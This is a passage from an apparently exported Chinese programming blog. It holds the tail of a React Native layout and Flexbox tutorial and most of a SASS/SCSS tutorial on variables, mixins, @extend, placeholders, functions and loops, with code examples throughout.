fetch(REQUEST_URL) // .then((response) =&gt; response.json()) // .then((responseData) =&gt; &#123; // // 注意，这里使用了this关键字，为了保证this在调用时仍然指向当前组件，我们需要对其进行“绑定”操作 // this.setState(&#123; // movies: responseData.movies, // &#125;); // &#125;); &#125; // 在生命周期中调用接口 componentDidMount() &#123; this.fetchData(); &#125; render()&#123; if (!this.state.loaded) &#123; return this.renderLoadingView(); &#125; return ( &lt;FlatList data=&#123;this.state.data&#125; renderItem=&#123;this.renderMovie&#125; style=&#123;styles.list&#125; keyExtractor=&#123;item =&gt; item.id&#125; /&gt; ); &#125; // 加载动画 renderLoadingView() &#123; return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;Text&gt; 正在加载电影数据…… &lt;/Text&gt; &lt;/View&gt; ); &#125; // 渲染列表 renderMovie(&#123; item &#125;) &#123; // &#123; item &#125;是一种“解构”写法，请阅读ES2015语法的相关文档 // item也是FlatList中固定的参数名，请阅读FlatList的相关文档 return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;Image source=&#123;&#123;uri: item.posters.thumbnail&#125;&#125; style=&#123;styles.thumbnail&#125; /&gt; &lt;View style=&#123;styles.rightContainer&#125;&gt; &lt;Text style=&#123;styles.title&#125;&gt;&#123;item.title&#125;&lt;/Text&gt; &lt;Text style=&#123;styles.year&#125;&gt;&#123;item.year&#125;&lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; ); &#125;&#125;const styles = StyleSheet.create(&#123; list: &#123; paddingTop: 20, backgroundColor: '#F5FCFF', &#125;, container: &#123; flex: 1, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', backgroundColor: '#F5FCFF', &#125;, rightContainer: &#123; flex: 1, &#125;, title: &#123; fontSize: 20, marginBottom: 8, textAlign: 'center', &#125;, year: &#123; textAlign: 'center', &#125;, thumbnail: &#123; width: 53, height: 81 &#125;&#125;);export default App; 设计RN中的样式所有的核心组件都接受名为style的属性。这些样式名基本上是遵循了 web 上的 CSS 的命名，只是按照 JS 的语法要求使用了驼峰命名法，例如将background-color改为backgroundColor。 style属性可以是一个普通的 JavaScript 对象 使用StyleSheet.create来集中定义组件的样式。 1234567891011121314151617181920212223242526import React, &#123; Component &#125; from 'react';import &#123; StyleSheet, Text, View &#125; from 'react-native';export default class LotsOfStyles extends Component &#123; render() &#123; return ( &lt;View&gt; &lt;Text style=&#123;styles.red&#125;&gt;just red&lt;/Text&gt; &lt;Text style=&#123;styles.bigBlue&#125;&gt;just bigBlue&lt;/Text&gt; &lt;Text style=&#123;[styles.bigBlue, styles.red]&#125;&gt;bigBlue, then red&lt;/Text&gt; &lt;Text style=&#123;[styles.red, styles.bigBlue]&#125;&gt;red, then bigBlue&lt;/Text&gt; &lt;/View&gt; ); &#125;&#125;const styles = StyleSheet.create(&#123; bigBlue: &#123; color: 'blue', fontWeight: 'bold', fontSize: 30, &#125;, red: &#123; color: 'red', &#125;,&#125;); 高度与宽度组件的高度和宽度决定了其在屏幕上显示的尺寸。 指定宽高样式中指定固定的width和height。React Native 中的尺寸都是无单位的，表示的是与设备像素密度无关的逻辑像素点。 1234567891011121314import React, &#123; Component &#125; from 'react';import &#123; View &#125; from 'react-native';export default class FixedDimensionsBasics extends Component &#123; render() &#123; return ( &lt;View&gt; &lt;View style=&#123;&#123;width: 50, height: 50, backgroundColor: 'powderblue'&#125;&#125; /&gt; &lt;View style=&#123;&#123;width: 100, height: 100, backgroundColor: 'skyblue'&#125;&#125; /&gt; &lt;View style=&#123;&#123;width: 150, height: 150, backgroundColor: 'steelblue'&#125;&#125; /&gt; &lt;/View&gt; ); &#125;&#125; 这样给组件设置尺寸也是一种常见的模式，比如要求在不同尺寸的屏幕上都显示成一样的大小。 注意：此时没法适配多种屏幕大小 弹性（Flex）宽高在组件样式中使用flex可以使其在可利用的空间中动态地扩张或收缩。一般而言我们会使用flex:1来指定某个组件扩张以撑满所有剩余的空间。如果有多个并列的子组件使用了flex:1，则这些子组件会平分父容器中剩余的空间。如果这些并列的子组件的flex值不一样，则谁的值更大，谁占据剩余空间的比例就更大（即占据剩余空间的比等于并列组件间flex值的比）。 1234567891011121314151617181920212223242526272829const App = () =&gt; &#123; return ( &lt;View style=&#123;styles.father&#125;&gt; &lt;View style=&#123;styles.son1&#125; /&gt; &lt;View style=&#123;styles.son2&#125; /&gt; &lt;View style=&#123;styles.son3&#125; /&gt; &lt;/View&gt; )&#125;// 去掉父View中的`flex: 1`。 ----- View不再具有尺寸，因此子组件也无法再撑开。// 然后再用`height: 300`来代替父View的`flex: 1` ---- 父View的高度变成300const styles = StyleSheet.create(&#123; father: &#123; flex: 1, // flexDirection: \"row\", // 改变子元素的伸缩方向 &#125;, son1: &#123; flex: 1, backgroundColor: 'powderblue' &#125;, son2: &#123; flex: 2, backgroundColor: 'skyblue' &#125;, son3: &#123; flex: 3, backgroundColor: 'steelblue' &#125;,&#125;); 使用Flexbox布局Flexbox 可以在不同屏幕尺寸上提供一致的布局结构。 使用flexDirection、alignItems和 justifyContent三个样式属性就已经能满足大多数布局需求。 React Native 中的 Flexbox 的工作原理和 web 上的 CSS 基本一致，当然也存在少许差异。首先是默认值不同：flexDirection的默认值是column而不是row，而flex也只能指定一个数字值。 Flex如上 Flex DirectionflexDirection可以决定布局的主轴。水平轴(row)方向，竖直轴(column)方向。默认值是竖直轴(column)方向。 12345678910111213class App extends Component &#123; render() &#123; return ( // 尝试把`flexDirection`改为`column`看看 &lt;View style=&#123;&#123;flex: 1, flexDirection: 'row'&#125;&#125;&gt; &lt;View style=&#123;&#123;width: 50, height: 50, backgroundColor: 'powderblue'&#125;&#125; /&gt; &lt;View style=&#123;&#123;width: 50, height: 50, backgroundColor: 'skyblue'&#125;&#125; /&gt; &lt;View style=&#123;&#123;width: 50, height: 50, backgroundColor: 'steelblue'&#125;&#125; /&gt; &lt;/View&gt; ); &#125;&#125; 布局方向LTR：文本和子项，从左到右排列 布局方向指定层次结构中子级和文本的布局方向。 布局方向也会影响边的起点和终点。 默认情况下，React Native使用LTR布局方向进行布局。 在此模式下，开始是指左，结束是指右。 LTR（默认值）文本和子项，从左到右排列。 元素的开始处应用的边距和填充在左侧。 RTL文本和子级，从右到左排列。 应用于元素开始的边距和填充在右侧。 Justify Content1234567891011121314151617class App extends Component &#123; render() &#123; return ( // 尝试把`justifyContent`改为`center`看看 // 尝试把`flexDirection`改为`row`看看 &lt;View style=&#123;&#123; flex: 1, flexDirection: 'column', // 默认纵向布局 justifyContent: 'space-between', &#125;&#125;&gt; &lt;View style=&#123;&#123;width: 100, height: 100, backgroundColor: 'powderblue'&#125;&#125; /&gt; &lt;View style=&#123;&#123;width: 100, height: 100, backgroundColor: 'skyblue'&#125;&#125; /&gt; &lt;View style=&#123;&#123;width: 100, height: 100, backgroundColor: 'steelblue'&#125;&#125; /&gt; &lt;/View&gt; ); &#125;&#125; Align Items12345678910111213141516171819class App extends Component &#123; render() &#123; return ( // 尝试把`alignItems`改为`flex-start`看看 // 尝试把`justifyContent`改为`flex-end`看看 // 尝试把`flexDirection`改为`row`看看 &lt;View style=&#123;&#123; flex: 1, flexDirection: 'column', justifyContent: 'center', alignItems: 'stretch', &#125;&#125;&gt; &lt;View style=&#123;&#123;width: 50, height: 50, backgroundColor: 'powderblue'&#125;&#125; /&gt; &lt;View style=&#123;&#123;height: 50, backgroundColor: 'skyblue'&#125;&#125; /&gt; &lt;View style=&#123;&#123;height: 100, backgroundColor: 'steelblue'&#125;&#125; /&gt; &lt;/View&gt; ); &#125;&#125; Align SelfalignSelf具有与alignItems相同的选项和效果，但是不影响容器中的子元素，您可以将此属性应用于单个子元素，以更改其在其父元素中的对齐方式。alignSelf用alignItems覆盖父类设置的任何选项。 123456789101112131415161718class App extends Component &#123; render() &#123; return ( &lt;View style=&#123;&#123; flex: 1, flexDirection: 'column', justifyContent: 'center', alignItems: 'stretch', &#125;&#125;&gt; &lt;View style=&#123;&#123;height: 100, backgroundColor: 'powderblue'&#125;&#125; &gt; &lt;Text style=&#123;&#123;alignSelf: 'flex-end',weight: 50, height: 50, backgroundColor: 'red'&#125;&#125; &gt;子内容&lt;/Text&gt; &lt;/View&gt; &lt;View style=&#123;&#123;height: 50, backgroundColor: 'skyblue'&#125;&#125; /&gt; &lt;View style=&#123;&#123;height: 100, backgroundColor: 'steelblue'&#125;&#125; /&gt; &lt;/View&gt; ); &#125;&#125; alignSelf: flex-start|flex-end|center|stretch Align ContentalignContent定义沿横轴的线分布。 仅当使用flexWrap将项目包装到多行时，此功能才有效。 flex-start（默认值）将换行对齐到容器横轴的起点。 flex-end将换行对齐到容器横轴的末端。 stretch 包装线以匹配容器横轴的高度。 center将包装线对齐到容器横轴的中心。 space-between在容器的主轴上均匀间隔的线，在线之间分配剩余空间。 space-around在容器的主轴上均匀间隔地包裹线，在线周围分配剩余空间。 与使用空格之间的空间相比，周围的空间将导致空间分配到第一行的开头和最后一行的末尾。 space-evenly 沿主轴均匀地分布在对齐容器内。 每对相邻项之间的间距，主开始边缘和第一个项目以及主结束边缘和最后一个项目都完全相同。 Flex WrapflexWrap属性在容器上设置，并控制当子原生沿主轴溢出容器大小时发生的情况。 默认情况下，子级被强制为一行（可以收缩元素）。 如果允许包装，则根据需要将项目沿主轴包装成多行。 换行时，可以使用alignContent指定行在容器中的放置方式。 Flex Basis, Grow, and Shrink flexGrow描述如何沿主轴在容器的子级之间分配容器中的任何空间。 布置好其子项后，容器将根据其子项指定的伸缩增长值分配所有剩余空间。 flexGrow接受任何大于等于0的浮点值，其中0为默认值。 容器将在孩子之间分配剩余空间，该剩余空间将根据孩子的弹性增长值来加权。 flexShrink描述了在子项的总大小溢出主轴上容器大小的情况下如何沿主轴收缩子项。 Flex收缩与Flex增长非常相似，如果任何溢出大小都被视为负剩余空间，则可以用相同的方式来考虑。 通过允许孩子根据需要生长和收缩，这两个属性也可以很好地协同工作。 Flex收缩接受任何大于等于0的浮点值，默认值为1。 容器将根据其子项的flex收缩值对子项进行收缩。 flexBasis是一种与轴无关的方式，用于沿主轴提供项目的默认大小。 如果子项的父级是具有flexDirection：row的容器，则设置子项的flex基础类似于设置子项的宽度；如果子项的父级是具有flexDirection：列的容器，则设置子项的高度。 项目的伸缩基础是该项目的默认大小，即执行任何伸缩增长和伸缩收缩计算之前的项目大小。 宽度和高度Yoga中的width属性指定元素内容区域的宽度。 同样，height属性指定元素内容区域的高度。 宽度和高度都可以采用以下值： auto是默认值，React Native根据元素的内容（无论是其他子元素，文本还是图像）计算元素的宽度/高度。 pixel定义宽度/高度，以绝对像素为单位。 根据组件上设置的其他样式，这可能是节点的最终尺寸，也可能不是。 percent定义宽度或高度，以其父级宽度或高度的百分比表示。 绝对和相对布局元素的位置类型定义了元素在其父元素中的位置。 相对（默认值）默认情况下，元素是相对放置的。 这意味着元素将根据布局的正常流程进行定位，然后根据上，右，下和左的值相对于该位置偏移。 偏移量不会影响任何同级元素或父元素的位置。 绝对当绝对定位时，元素不参与正常的布局流程。 相反，它的布局与兄弟姐妹无关。 根据顶部，右侧，底部和左侧的值确定位置。","categories":[{"name":"ReactNative","slug":"ReactNative","permalink":"http://yoursite.com/categories/ReactNative/"}],"tags":[{"name":"ReactNative","slug":"ReactNative","permalink":"http://yoursite.com/tags/ReactNative/"}]},{"title":"SASS","slug":"SCSS","date":"2020-03-24T00:19:20.000Z","updated":"2020-07-14T09:49:06.198Z","comments":true,"path":"posts/ea50967e.html","link":"","permalink":"http://yoursite.com/posts/ea50967e.html","excerpt":"","text":"SASS什么是SASS​ SASS 是一种基于 CSS 的预处理语言，他在CSS的语法的基础上增加了变量(variables)\\嵌套(nested rules)、混合(mixins)、导入(inline import)等高级功能，这样在开发项目是便于管理整体项目的样式风格。 SASS的特征 完全兼容 CSS3 在 CSS 基础上增加变量、嵌套 (nesting)、混合 (mixins) 等功能 通过函数进行颜色值与属性值的运算 提供控制指令等高级功能 自定义输出格式 SASS的语法格式SASS分为两种语法，一种是SCSS，另一种就是SASS。 SCSS是最新的语法： 扩展名为.scss SCSS语法规则和CSS的语法规则基本一样，使用大括号{}和分号;来分隔块的样式 增强了对CSS3语法的支持 SASS是老语法： 扩展名为.sass SASS语法也称之为SASS的缩进语法，使用缩进和换行来分块，而不是使用分号来分隔语句，和stylus这种预处理语言类似 现在只学习scss语法 ##SCSS语法 变量（Variables）123456$color: #333; // 声明变量$bgcolor:#f36;body &#123; color: $color; // 引用变量 background-color: $bgcolor;&#125; 变量默认值!default12345678$color:red;$color:blue !default;p&#123; color:$color; //red&#125;// 假设变量申明带有!default，如果在此申明之前没有这个变量的申明，则用这个值，// 反之如果之前有申明，则用申明的值。// 当然如果你先!default申明，然后再申明一次，那就没什么意思了，这就是基本的变量覆盖，第一次申明的有无!default都一样。 变量用#{}包裹1234567891011$btnClass: btn !default;$borderDirection: top !default;.#&#123;$btnClass&#125;&#123; border-#&#123;$borderDirection&#125;:1px solid #ccc;&#125;// 解析成的css：.btn&#123; border-top:1px solid #ccc;&#125; 多个变量一起申明把多个相关的值写在一个变量里，然后通过nth($var,index)来获取第几个值。 123456789101112131415$linkColor: red blue !default;a&#123; color:nth($linkColor,1); &amp;:hover&#123; color:nth($linkColor,2); &#125;&#125;// 解析成的css：a &#123; color: red; &#125;a:hover &#123; color: blue; &#125; 嵌套(Nesting)SASS中的嵌套有两种，一种是选择器的嵌套，另外一种是样式的嵌套。 然而这两种嵌套的目的都是一样的，减少代码量，增强代码的可读性。 选择器的嵌套1234567891011121314151617$color: #333; $bgcolor:#f36;section &#123; margin: 10px; background-color: #f36; nav &#123; color: $color; height: 25px; a &#123; color: #0982c1; &amp;:hover&#123; text-decoration: underline; &#125; &#125; &#125;&#125; 样式的嵌套123456789101112li &#123; font: &#123; style:italic; family:serif; weight:bold; size:1.2em; &#125; &#125; // 当然font属性可以使用css3的合写，那就更简单了li &#123; font: serif italic bold 1.2em;&#125; MixinsMixins是SASS中最强大的特性之一，简单点来说，Mixins可以将一部分样式抽出，作为单独定义的模块，被很多选择器重复使用。 12345678@mixin error($borderWidth: 2px)&#123; border: $borderWidth solid #f00; color: #f00;&#125;span &#123; @include error(10px)&#125; 举例： 12345678910111213141516171819202122232425262728293031323334353637//Example: @include prefixer(border-radius, $radius, webkit spec);//----------------------------------------$prefix-for-webkit: true !default;$prefix-for-mozilla: true !default;$prefix-for-microsoft: true !default;$prefix-for-opera: true !default;$prefix-for-spec: true !default; // required for keyframe mixin//prefixer@mixin prefixer ($property, $value, $prefixes) &#123; @each $prefix in $prefixes &#123; @if $prefix == webkit and $prefix-for-webkit == true &#123; -webkit-#&#123;$property&#125;: $value !important; &#125; @else if $prefix == moz and $prefix-for-mozilla == true &#123; -moz-#&#123;$property&#125;: $value; &#125; @else if $prefix == ms and $prefix-for-microsoft == true &#123; -ms-#&#123;$property&#125;: $value; &#125; @else if $prefix == o and $prefix-for-opera == true &#123; -o-#&#123;$property&#125;: $value; &#125; @else if $prefix == spec and $prefix-for-spec == true &#123; #&#123;$property&#125;: $value; &#125; @else &#123; @warn \"Unrecognized prefix: #&#123;$prefix&#125;\"; &#125; &#125;&#125;@mixin skewX($degrees) &#123; @include prefixer(transform, skewX($degrees), webkit moz o ms spec); -webkit-backface-visibility: hidden;&#125;p &#123; @include skewX(45deg)&#125; 编译后： 12345678p &#123; -webkit-transform: skewX(45deg) !important; -moz-transform: skewX(45deg); -o-transform: skewX(45deg); -ms-transform: skewX(45deg); transform: skewX(45deg); -webkit-backface-visibility: hidden;&#125; @extend假设现在要设计一个普通错误样式与一个严重错误样式，一般会这样写： 123456789101112&lt;style&gt;.error &#123; border: 1px #f00; background-color: #fdd;&#125;.seriousError &#123; border-width: 3px;&#125;&lt;/style&gt;&lt;div class=\"error seriousError\"&gt; Oh no! You've been hacked!&lt;/div&gt; 使用@extend： 12345678.error &#123; border: 1px #f00; background-color: #fdd;&#125;.seriousError &#123; @extend .error; border-width: 3px;&#125; 注意@extendh会有一个缺点： 123456789101112.error &#123; border: 1px #f00; background-color: #fdd;&#125;// 这是一个其他样式p .error &#123; color: blue;&#125;.seriousError &#123; @extend .error; border-width: 3px;&#125; 但是在编译后的CSS： 1234567891011121314151617181920212223242526.error, .seriousError &#123; border: 1px #f00; background-color: #fdd;&#125;p .error, p .seriousError &#123; color: blue;&#125;.seriousError &#123; border-width: 3px;&#125;// 然而你只想实现.error, .seriousError &#123; border: 1px #f00; background-color: #fdd;&#125;p .error &#123; // 这部分的样式不能干扰到 seriousError color: blue;&#125;.seriousError &#123; border-width: 3px;&#125; 所以，通过@extend引用的类名，你要有绝对的自信，它从未用在几个地方。 嵌套、Mixins和@extend的缺点嵌套：有可能编译的css层级过深 Mixins：Mixins用来指定具体属性值会使css变得臃肿 Mixins的黄金规则是将相似的风格定义在一个@mixin中。请注意这里的一个关键词相似的，另外Mixins主要是用于重用，而不是用来指定具体的属性值。 @extend：@extend是可以读取SASS文件中类名，这样就会出现意想不到的问题，如上的.error 强大的%placeholders使用%和@extend就可以将继承中埋下的地雷给排了。 %只是一个占位符，他不是正常的选择器，不像.classes或者#ids，只要不通过@extend调用，他是不会产生任何代码量。 首先使用%placeholders定义一个公用样式，类似于.class： 123%placeholders &#123; color: red;&#125; 在需要使用的地方通过@extend来调用： 123selector &#123; @extend %placeholders;&#125; 举例： 1234567891011121314151617181920212223242526272829303132@mixin fit-content() &#123; width: -webkit-fit-content; width: -moz-fit-content; width: -o-fit-content; width: -ms-fit-content; width: fit-content;&#125;%clearfix &#123; *zoom: 1; &amp;:after, &amp;:before &#123; content: \"\"; display: table; &#125; &amp;:after &#123; clear: both; overflow: hidden; &#125;&#125;nav &#123; display: block; ul &#123; margin: 50px auto; width: 800px; @include fit-content(); padding: 0; list-style: none; @extend %clearfix; &#125;&#125; @function@function与@mixin，%这两者的第一点不同在于sass本身就有一些内置的函数，方便我们调用，如强大的color函数；其次就是它返回的是一个值，而不是一段css样式代码什么的。 12345678910$f00: #f00;//作为变量值$redDark: darken($f00,10%) !default;//作为属性值p&#123; color: darken($f00,70%); background-color: $redDark;&#125; rgba分为两种：rgba($red, $green, $blue, $alpha)和rgba($color, $alpha)。 第一种跟css3一样，不介绍，第二种对我们有点用，实例： 12rgba(#102030, 0.5) =&gt; rgba(16, 32, 48, 0.5)rgba(blue, 0.2) =&gt; rgba(0, 0, 255, 0.2) ie-hex-strie-hex-str($color) 这个函数将一个颜色格式化成ie滤镜使用，在做css3使用滤镜兼容的时候用得上，实例： 123ie-hex-str(#abc) =&gt; #FFAABBCCie-hex-str(#3322BB) =&gt; #FF3322BBie-hex-str(rgba(0, 255, 0, 0.5)) =&gt; #8000FF00 darkendarken(color,color,amount) 第一个参数是颜色，第二参数是百分数介于0%-100%，表示将某个颜色变暗多少个百分比。 12darken(hsl(25, 100%, 80%), 30%) =&gt; hsl(25, 100%, 50%)darken(#800, 20%) =&gt; #200 lightenlighten(color,color,amount) 第一个参数是颜色，第二参数是百分数介于0%-100%，表示将某个颜色变亮多少个百分比。 12lighten(hsl(0, 0%, 0%), 30%) =&gt; hsl(0, 0, 30)lighten(#800, 20%) =&gt; #e00 percentagepercentage($value)： 将一个没有单位的数字转成百分比形式 12percentage(0.2) =&gt; 20%percentage(100px / 50px) =&gt; 200% lengthlength($list) 返回一个列表的长度 12length(10px) =&gt; 1length(#514721 #FFF6BF #FFD324) =&gt; 3 nthnth(list,list,n); 返回列表里面第n个位置的值 12nth(10px 20px 30px, 1) =&gt; 10pxnth((Helvetica, Arial, sans-serif), 3) =&gt; sans-serif unitunit($number) 得到这个数的单位 12345unit(100) =&gt; \"\"unit(100px) =&gt; \"px\"unit(3em) =&gt; \"em\"unit(10px * 5em) =&gt; \"em*px\"unit(10px * 5em / 30cm / 1rem) =&gt; \"em*px/cm*rem\" unitlessunitless($number) 返回这个数是否没有单位 12unitless(100) =&gt; trueunitless(100px) =&gt; false 三目判断if(condition,condition,if-true, $if-false) 第一个表示条件，第二个表示条件为真的值，第三个表示为假的值 12if(true, 1px, 2px) =&gt; 1pxif(false, 1px, 2px) =&gt; 2px 注意函数是返回一个值，不能直接放到sass里面直接去运行的，会报错。 你可以把这些用在判断或者属性值里面，那么就是一级棒。 下面我们来搞点自己定义的函数吧，先来个简单的： 123456789101112// px转em@function pxToEm($px, $base: 16) &#123; @return ($px / $base) * 1em;&#125;// 调用下：p&#123; font-size:pxToEm(20);&#125;// 解析后的css：p &#123; font-size: 1.25em;&#125; @if和@else1234567891011$filter:false !default; //是否开启ie滤镜//背景色半透明@mixin bgcolor-alpha($bgcolor: rgba(0,0,0,.5))&#123; color:#fff; @if $filter&#123; filter:progid:DXImageTransform.Microsoft.gradient(enabled='true',startColorstr='#&#123;ie-hex-str($bgcolor)&#125;', endColorstr='#&#123;ie-hex-str($bgcolor)&#125;'); &#125;@else&#123; background-color: #333; &#125; background-color:$bgcolor;&#125; 这是半透明rgba背景的一段代码，高级浏览器用rgba，ie6-8如果开启滤镜用滤镜，不开启滤镜就用纯色，常用于图片下方浮现标题。 当然也不可能总是判断一个变量的真假那么简单，没有或与非的情况吧。sass的@if用not,or,and分别表示非，或，与。 12345678910111213141516171819202122$a: false !default;$b: true !default;@if not($a)&#123; p&#123; color:red; &#125;&#125;div&#123; font-size:14px; @if $a or $b&#123; width:300px; &#125;&#125;li&#123; line-height:24px; @if $a and $b&#123; float:left; &#125;&#125; 想想还是漏了个，sass用==,!=分别表示等于与不等于。 1234567891011121314151617181920$radius: 5px !default;.box-border&#123; border:1px solid #ccc; padding:10px; @if $radius != 0&#123; border-radius:$radius; &#125;&#125; $sizeClass: small !default;.size&#123; @if $sizeClass == 'small'&#123; padding:5px; &#125;@else&#123; padding:10px; &#125;&#125; @forfor循环有两种形式，分别为：@for $var from start through end和@for $var start from to end` 。$i表示变量，start表示起始值，end表示结束值，这两个的区别是关键字through表示包括end这个数，而to则不包括end这个数。先来个简单的： 123@for $i from 1 through 3 &#123; .item-#&#123;$i&#125; &#123; width: 2em * $i; &#125;&#125; @each语法：@each $var in 12345@each $animal in puma, sea-slug, egret, salamander &#123; .#&#123;$animal&#125;-icon &#123; background-image: url('/images/#&#123;$animal&#125;.png'); &#125;&#125; 1234567891011$sprite: puma sea-slug egret salamander !default;%sprite-animal&#123; background: url('/images/animal.png') no-repeat;&#125;@each $animal in $sprite &#123; .#&#123;$animal&#125;-icon &#123; @extend %sprite-animal; background-position:0 -(index($sprite,$animal)*30px); &#125;&#125; 使用scss设计按钮样式： 1234567891011121314151617181920212223//$btnColorClass: (primary #0078E7 #fff) (green $green #fff);$btnColorClass: (primary #0078E7 #fff) (blue #00A3CF #fff) (orange #F47837 #fff) !default;@mixin btn-color($bgColor:#e6e6e6, $textColor:#333)&#123; color:$textColor; background-color: $bgColor; border:1px solid darken($bgColor, 5%); border-color:lighten($bgColor, 2%) darken($bgColor, 5%) darken($bgColor, 5%) lighten($bgColor, 2%); &amp;:hover&#123; background-color: darken($bgColor,5%); color:$textColor; &#125;&#125;@each $colorClass in $btnColorClass&#123; $class: nth($colorClass,1); $bgColor: nth($colorClass,2); $textColor: nth($colorClass,3); .btn-#&#123;$class&#125;&#123; @include btn-color($bgColor,$textColor); &#125;&#125; @include vs @extend避免代码重复生成， SASS中产生了Mixins，我们可以将相似的样式定义成一个函数模块，然后通过@include来调用。但很多时候，我们又不需要这么强大的功能。 这个时候出现@extend来调用定义好相同样式的类，可没想到，这个功能是方便了，但无形中为使用者埋下了一个地雷。 为了解除这个隐患，在SASS3.2中增加了一个%placeholders功能。让大家能很方便定义一些功能简单的相同样式模块。 通过前面的介绍@mixin需要@include来调用，而.class和%placeholders需要@extend来调用，那么两者有何区别呢？ @include主要是用来调用@mixin定义的函数模块。在@mixin中可以定义一个相似功能样式，而且可以设置变量、定义参数和默认参数值； @extend主要是用来调用.class或者%placeholders定义的属性模块；在.class或者%placeholders中可以定义一个相同样式，但这里面不能定义参数； @include每次调用相同的@mixin时，编译出来的CSS相同样式不会进行合并； @extend每次调用相同的 .class时，如果.class在样式出现多次，那么编译出来的CSS有可能不是需要的样式； @extend每次调用相同的%placeholders时，编译出来的CSS相同样式会进行合并。 下面我们通过一个清除浮动的案例，分别看看@include和@extend之间的区别： @include与@mixin使用例子123456789101112131415161718192021@mixin clearfix&#123; &amp; &#123; *zoom: 1; &#125; &amp;:before, &amp;:after &#123; display: table; content: \"\"; &#125; &amp;:after &#123; clear: both; overflow: hidden; &#125;&#125;ul&#123; @include clearfix;&#125;.block &#123; @include clearfix;&#125; 编译后： 1234567891011121314151617181920212223ul &#123; *zoom: 1;&#125;ul:before, ul:after &#123; display: table; content: \"\";&#125;ul:after &#123; clear: both; overflow: hidden;&#125;.block &#123; *zoom: 1;&#125;.block:before, .block:after &#123; display: table; content: \"\";&#125;.block:after &#123; clear: both; overflow: hidden;&#125; 很明显，相同的样式不会进行合并。 @include和%placeholders使用例子123456789101112131415161718192021%clearfix&#123; &amp; &#123; *zoom: 1; &#125; &amp;:before, &amp;:after &#123; display: table; content: \"\"; &#125; &amp;:after &#123; clear: both; overflow: hidden; &#125;&#125;ul&#123; @extend %clearfix;&#125;.block &#123; @extend %clearfix;&#125; 编译后： 1234567891011.block, ul &#123; *zoom: 1;&#125;.block:before, ul:before, .block:after, ul:after &#123; display: table; content: \"\";&#125;.block:after, ul:after &#123; clear: both; overflow: hidden;&#125; 很明显相同样式代码已经进行合并。 Mixins与%placeholders的结合Mixins如果使用不当，就会产生很多重复的代码，但仅用@extend很多时候又无法达到功能上的需求。 那么有没有方法能把Mixins与%placeholders结合起来，取他们各自的优势呢？ 大家都知道,%placeholders就类似于CSS中的.classes或者#ids，只不过使用%代替了.和#。但%placeholders中的代码只有通过 @extend调用之后才会产生代码量，不然他是不会产生任何代码量。 下面我们来看一个Mixins与%placeholders结合在一起制作的一个网格系统。 12345678910111213141516171819%grid &#123; box-sizing: border-box; display: inline-block; padding-left: 1em; padding-right: 1em;&#125;@mixin grid($width: 1)&#123; @extend %grid; width: percentage($width);&#125;.grid-half &#123; @include grid(1 / 2);&#125;.grid-third &#123; @include grid(1 / 3);&#125; 按照这样的方法，我们可以制作出一个简单的百分比网格系统： 12345678910111213141516171819202122$columns: 12;$gutter: 2em;%grid &#123; box-sizing: border-box; display: inline-block; padding: &#123; left:$gutter / 2; right:$gutter / 2; &#125; &#125;@mixin grid($width: 1)&#123; @extend %grid; width: percentage($width);&#125;@for $column from 1 through $columns &#123; .grid-#&#123;$column&#125; &#123; @include grid(1 / $column); &#125;&#125; 使用Mixins和继承的细节了解了@include定义的@mixin,@extend定义的.class和@extend定义的%placeholders差异之后，我们在写SASS时，有一些细节大家应该了解： 不要使用没有设置参数的@mixin，他们应该是.class或者%placeholders; 不要轻意（从不使用）@extend调用.class。会得到你意想不到的结果，特别是定义的.class出现在嵌套或其他的样式表中，你应该使用@extend调用%placeholders; 不要使用太深的选择器嵌套。 如果你能避免，不要使用标签名。这不是一个taxative规则，但比id或者类名的性能要更低； 不要使用子选择器符号&gt;，在SASS中很无效； 不要使用同史选择器+，配合你当前的标记他是非常无效。 不要太相信SASS的自动编译，你应该时时检查生成的CSS。在SASS中纠错能力比较差； 案例实战 1.html结构 123456789101112131415&lt;ul class=\"menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt; &lt;a href=\"\"&gt;博客&lt;/a&gt; &lt;ul class=\"drop-menu\"&gt; &lt;li&gt;&lt;a href=\"\"&gt;CSS3&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;SASS&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;JavaScript&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;jQuery&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;案例&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;资源&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"\"&gt;前端收藏夹&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 有了结构，我们就要开始动手了，在动手之前对这个效果先简单的分析一下： 定义变量：我要定义几个变量，方便换成别的风格； 清除浮动：列表使用了浮动，需要清除浮动 清除列表默认样式：导航是使用ul制作，所以需要清除其默认样式 定义transfrom：效果中使用到了CSS3的transform，使用@mixin定义成一个模块 定义transition：下拉菜单出现的时候有一个transition效果 定义fit-content：使用CSS3的fit-content 定义box-shadow：使用CSS3的box-shadow 定义文本：设置菜单项文本效果 定义变量 1234567//1.定义变量$color: #fff !default; //设置文本颜色$bgColor: #34495e !default;//设置背景色$sfbgColor: #e74c3c !default;//设置悬浮背景色$fontSize: 14px !default;//设置字号$fontFamily: Arial, Helvetica !default;//设置字体$width: 462px !default; //设置默认宽度 清除浮动 1234567891011121314//2.使用%placeholders定义清除浮动%clearfix &#123; &amp;&#123; *zoom: 1; &#125; &amp;:before, &amp;:after&#123; content: \"\"; display: table; &#125; &amp;:after &#123; clear: both; overflow: hidden; &#125; 清除列表默认样式 1234567891011//3.清除列表默认样式%listStyle &#123; margin: 0; padding: 0; list-style: none outside none;&#125;$prefix-for-webkit: true !default;$prefix-for-mozilla: true !default;$prefix-for-microsoft: true !default;$prefix-for-opera: true !default;$prefix-for-spec: true !default; 定义transfrom 123456789101112131415161718// 4.浏览器前缀@mixin prefixer ($property, $value, $prefixes) &#123; @each $prefix in $prefixes &#123; @if $prefix == webkit and $prefix-for-webkit == true &#123; -webkit-#&#123;$property&#125;: $value; &#125; @else if $prefix == moz and $prefix-for-mozilla == true &#123; -moz-#&#123;$property&#125;: $value; &#125; @else if $prefix == ms and 